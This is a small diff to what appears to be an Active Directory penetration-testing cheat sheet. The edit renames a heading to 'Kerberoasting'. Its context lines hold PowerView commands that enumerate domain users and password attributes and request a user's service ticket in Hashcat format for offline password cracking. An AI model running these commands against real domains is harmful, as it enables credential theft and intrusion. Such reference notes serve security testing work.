@@ -234,7 +234,7 @@ Get-NetUser -properties name, pwdlastset, logoncount, badpwdcount
 Get-DomainUser -LDAPFilter "Description=*built*" | Select name,Description
 ```
 
-get user TGS ticket
+Kerberoasting - get user TGS ticket
 
 ```powershell
 Get-DomainUser -Identity <user> | Get-DomainSPNTicket -Format Hashcat
